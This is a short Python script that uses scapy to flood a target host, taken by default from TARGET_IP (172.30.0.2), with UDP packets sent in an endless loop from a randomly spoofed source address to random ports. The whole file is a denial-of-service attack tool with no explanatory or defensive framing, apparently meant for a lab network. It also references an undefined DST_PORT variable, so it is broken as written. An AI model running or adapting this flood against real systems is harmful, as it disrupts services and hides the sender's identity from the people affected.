#!/usr/bin/env python3
import os
import random
import time
from scapy.all import IP, UDP, RandShort, Raw, send

TARGET = os.getenv("TARGET_IP", "172.30.0.2")

if __name__ == "__main__":
    print(f"Starting flood against {TARGET}:{DST_PORT}")

    src_ip = f"{random.randint(2, 254)}.{random.randint(2, 254)}.{random.randint(2, 254)}.{random.randint(2, 254)}"
    packet = IP(src=src_ip, dst=TARGET) / UDP(dport=RandShort()) / Raw('A')
    send(packet, loop=1, inter=0.5)
